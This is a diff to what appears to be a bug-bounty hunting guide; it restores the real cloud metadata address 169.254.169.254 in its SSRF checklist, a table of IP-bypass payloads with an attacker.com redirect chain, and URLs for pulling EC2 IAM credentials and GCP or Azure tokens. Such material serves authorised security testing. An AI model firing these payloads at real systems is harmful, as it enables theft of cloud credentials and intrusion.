@@ -68,7 +68,7 @@ Full pipeline: Recon -> Learn -> Hunt -> Validate -> Report. One skill for every
 | Bug A (Signal) | Hunt for Bug B | Escalate to C |
 |----------------|---------------|---------------|
 | IDOR (read) | PUT/DELETE on same endpoint | Full account data manipulation |
-| SSRF (any) | Cloud metadata [REDACTED_IP] | IAM credential exfil -> RCE |
+| SSRF (any) | Cloud metadata 169.254.169.254 | IAM credential exfil -> RCE |
 | XSS (stored) | Check if HttpOnly is set on session cookie | Session hijack -> ATO |
 | Open redirect | OAuth redirect_uri accepts your domain | Auth code theft -> ATO |
 | S3 bucket listing | Enumerate JS bundles | Grep for OAuth client_secret -> OAuth chain |
@@ -534,7 +534,7 @@ grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | gre
 
 ## SSRF -- Server-Side Request Forgery
 
-- [ ] Try cloud metadata: `http://[REDACTED_IP]/latest/meta-data/`
+- [ ] Try cloud metadata: `http://169.254.169.254/latest/meta-data/`
 - [ ] Try internal services: `http://127.0.0.1:6379/` (Redis), `:9200` (Elasticsearch), `:27017` (MongoDB)
 - [ ] Test all IP bypass techniques (see table below)
 - [ ] Test protocol bypass: `file://`, `dict://`, `gopher://`
@@ -550,7 +550,7 @@ grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | gre
 | Short IP | `http://127.1/` | Abbreviated notation |
 | IPv6 | `http://[::1]/` | Loopback in IPv6 |
 | IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
-| Redirect chain | `http://attacker.com/302->http://[REDACTED_IP]` | Check each hop |
+| Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Check each hop |
 | DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
 | URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
 | Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
@@ -1243,16 +1243,16 @@ done
 
 ### EC2 Metadata (via SSRF)
 ```bash
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
 # Returns role name, then:
-http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ROLE-NAME
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
 # Returns AccessKeyId, SecretAccessKey, Token -> Critical
 
 # GCP (needs header Metadata-Flavor: Google):
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 
 # Azure (needs header Metadata: true):
-http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
 ```
 
 ### Firebase Open Rules
